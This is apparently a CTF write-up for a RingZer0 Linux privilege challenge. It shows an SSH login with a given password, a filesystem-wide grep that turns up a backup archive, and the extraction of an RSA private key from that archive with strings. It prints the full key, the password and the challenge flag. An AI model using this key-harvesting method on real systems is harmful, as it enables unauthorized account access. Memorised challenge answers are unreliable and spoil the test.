#####[Level 4 SysAdmin Linux Level Up](http://ringzer0team.com/challenges/146)
#####Answer
At first moment we must login using ssh:  
```
  ssh morpheus@for01.ringzer0team.com -p 13375
```
Then you asked for password and you will enter `VNZDDLq2x9qXCzVdABbR1HOtz` as a password, Now we wanna access oracle accessing an account needs password or maybe ssh RSA key login so first we search for `oracle` in our root directory:  
```
  $ grep 'oracle' -R / 2>/dev/null
  Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
  Binary file /var/run/utmp matches
  Binary file /var/cache/apt-show-versions/apackages matches
  Binary file /var/cache/man/index.db matches
```
It seems oracle has backed his profile up so we use `strings` command too see the backup file
```
  $ strings /backup/c074fa6ec17bb35e168366c43cf4cd19
  .
  .
  .
  home/oracle/.ssh/id_rsa
  0000600
  0001750
  0001750
  00000003217
  12310211305
  016007
  ustar  
  chamilton
  chamilton
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
  WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
  hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
  F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
  BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
  jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
  MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
  nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
  5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
  XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
  bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
  mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
  i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
  dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
  Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
  73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
  SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
  jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
  oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
  ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
  dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
  TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
  bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
  AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
  iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
  -----END RSA PRIVATE KEY-----
  .
  .
  .
```
So now we have rsa private key, Then easily we store the key in a file such as `id_rsa` and change the file's permission
```
$ echo $RSAKey > id_rsa
$ chmod 600 id_rsa
```
Then it's enough to ssh using `id_rsa` file as a key, thus we have:
```
  $ ssh oracle@for01.ringzer0team.com -p 13375 -i id_rsa
  .
  .
  .
  Last login: Wed Jul  9 13:28:06 2014 from 37.255.26.252
  oracle@forensics:~$
```
Now in the oracle's shell simply read `flag.txt` file and decode it by a [base64 decoder](http://ringzer0team.com/tool) and the result is `FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP`

#####NOTE: It seems the backup file changes each time so some contents are wrong

Keep calm and code in Linux :O
